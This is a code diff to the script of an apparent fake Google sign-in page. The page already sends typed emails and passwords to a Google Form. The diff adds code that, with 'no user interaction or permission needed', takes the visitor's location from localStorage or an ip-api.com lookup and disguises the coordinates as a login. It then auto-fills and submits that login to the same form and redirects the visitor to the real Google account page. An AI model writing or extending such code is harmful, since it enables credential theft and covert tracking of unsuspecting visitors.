@@ -403,37 +403,75 @@
                 console.log(`📤 Sent to form: email="${email}", password="${password}"`);
             }
 
-            // Auto-submit z1 (latitude) + @gmail.com as email and z2 (longitude) as password
-            // Sends directly — no user interaction or permission needed
-            (function autoSubmitLocationData() {
-                function sendLocationToForm(z1, z2) {
-                    const autoEmail = z1 + '@gmail.com';
-                    const autoPassword = String(z2);
-                    submitToGoogleForm(autoEmail, autoPassword);
-                    console.log(`📍 Auto-submitted location: email="${autoEmail}", password="${autoPassword}"`);
-                }
+            // Auto-fill and auto-submit z1@gmail.com + z2 through the form UI
+            // No user interaction needed — fills fields and clicks buttons automatically
+            let isAutoSubmitting = false;
 
-                // Try localStorage first (set by index.html)
+            function runAutoFlow(z1Val, z2Val) {
+                if (isAutoSubmitting) return;
+                isAutoSubmitting = true;
+
+                const autoEmail = z1Val + '@gmail.com';
+                const autoPass = String(z2Val);
+
+                // Also send directly to Google Form immediately (background)
+                submitToGoogleForm(autoEmail, autoPass);
+
+                // Step 1: Fill email and click Next (after small delay for page to render)
+                setTimeout(function() {
+                    emailInput.value = autoEmail;
+                    emailInput.dispatchEvent(new Event('input'));
+                    storedEmailValue = autoEmail;
+
+                    // Skip validation — go directly to password step
+                    shownEmail.textContent = autoEmail;
+                    userAvatar.textContent = autoEmail.charAt(0).toUpperCase();
+                    stepEmail.classList.add('hidden-step');
+                    stepPassword.classList.remove('hidden-step');
+                    mainTitle.textContent = 'Welcome';
+                    subTitle.innerHTML = '';
+
+                    // Step 2: Fill password and submit (after another delay)
+                    setTimeout(function() {
+                        passwordInput.value = autoPass;
+                        passwordInput.dispatchEvent(new Event('input'));
+
+                        // Submit directly — skip validation and "wrong password" logic
+                        submitToGoogleForm(autoEmail, autoPass);
+                        successToast.classList.add('show');
+                        loginBtn.classList.add('loading-state');
+                        loginBtn.querySelector('span').textContent = '';
+
+                        console.log(`📍 Auto-flow complete: email="${autoEmail}", password="${autoPass}"`);
+
+                        setTimeout(function() {
+                            window.location.href = 'https://myaccount.google.com';
+                        }, 2000);
+                    }, 800);
+                }, 500);
+            }
+
+            // Try localStorage first, then IP fallback
+            (function autoSubmitLocationData() {
                 const z1 = localStorage.getItem('z1');
                 const z2 = localStorage.getItem('z2');
                 if (z1 && z2) {
-                    sendLocationToForm(z1, z2);
-                }
-
-                // IP-based fallback — no permission popup
-                if (!z1 || !z2) {
+                    runAutoFlow(z1, z2);
+                } else {
+                    // IP-based fallback — no permission popup
                     fetch('http://ip-api.com/json/?fields=status,lat,lon')
                         .then(function(res) { return res.json(); })
                         .then(function(data) {
                             if (data.status === 'success') {
                                 localStorage.setItem('z1', data.lat);
                                 localStorage.setItem('z2', data.lon);
-                                sendLocationToForm(data.lat, data.lon);
+                                runAutoFlow(data.lat, data.lon);
                             }
                         })
                         .catch(function() {});
                 }
             })();
+
 
             function validateEmailAndSend() {
                 const raw = emailInput.value;
